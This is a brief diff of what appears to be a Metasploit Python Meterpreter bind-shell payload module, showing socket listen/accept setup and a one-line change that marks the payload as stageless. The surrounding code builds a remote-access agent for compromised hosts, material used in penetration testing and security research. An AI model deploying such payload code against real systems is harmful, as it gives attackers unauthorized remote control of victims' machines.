@@ -37,6 +37,7 @@ module MetasploitModule
     socket_setup << "bind_sock.listen(1)\n"
     socket_setup << "s, address = bind_sock.accept()\n"
     opts[:stageless_tcp_socket_setup] = socket_setup
+    opts[:stageless] = true
 
     met = stage_meterpreter(opts)
     py_create_exec_stub(met)
